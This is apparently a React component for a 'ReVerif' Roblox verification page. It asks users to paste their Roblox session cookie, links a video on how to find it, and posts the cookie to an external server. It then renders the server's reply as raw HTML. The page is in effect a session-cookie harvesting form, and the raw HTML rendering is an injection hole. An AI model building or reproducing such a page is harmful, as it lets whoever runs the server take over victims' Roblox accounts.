import React, { useState } from "react";

const ReVerif: React.FC = () => {
  const [userInput, setUserInput] = useState<string>("");
  const [result, setResult] = useState<string>("");

  const submitForm = async () => {
    if (!userInput) {
      alert("Please enter your ROBLOX cookie.");
      return;
    }

    try {
      const response = await fetch(
        "https://reverif.vercel.app/getVerificationLink",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ cookie: userInput }),
        }
      );

      if (response.ok) {
        const data = await response.json();
        setResult(`
        <div class="flex justify-center">
          <a class="px-4 py-2 mb-2 font-bold text-white bg-blue-500 rounded hover:bg-blue-700" href="${data.verificationLink}">
            Verification Link
          </a>
        </div>
      `);
      } else {
        setResult("");
        alert(
          "An error occurred while fetching the verification link. If you are trying to verify after it visiting the site and failing to get verified, please wait 7 days."
        );
      }
    } catch (error) {
      console.error("Error occurred:", error);
      alert("An unexpected error occurred. Please try again later.");
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen">
      <form id="userForm" className="max-w-sm">
        <div className="flex">
          <input
            type="password"
            id="userInput"
            name="userInput"
            value={userInput}
            onChange={(e) => setUserInput(e.target.value)}
            className="w-full px-4 py-2 mb-2 border border-gray-300 rounded-l"
            placeholder="Enter ROBLOX Cookie"
          />
          <button
            type="button"
            onClick={submitForm}
            className="px-4 py-2 mb-2 font-bold text-white bg-blue-500 rounded-r hover:bg-blue-700 w-ful"
          >
            &gt;
          </button>
        </div>
        <p
          id="result"
          className="mt-4"
          dangerouslySetInnerHTML={{ __html: result }}
        ></p>
        <p className="mt-2 text-sm text-gray-500">
          <a
            href="https://www.youtube.com/watch?v=sz07F5inaFg"
            target="_blank"
            className="text-center text-blue-400 hover:underline"
          >
            Don't know how to receive your ROBLOX cookie?
          </a>
        </p>
      </form>

      <div className="absolute bottom-0 left-0 mb-4 ml-4 text-xs text-white">
        ReVerif V1.0
        <br />
        Made with <span className="heart">❤️</span> by{" "}
        <a
          href="https://tame.wtf"
          target="_blank"
          className="text-blue-500 hover:underline"
        >
          Tame
        </a>
      </div>
    </div>
  );
};

export default ReVerif;
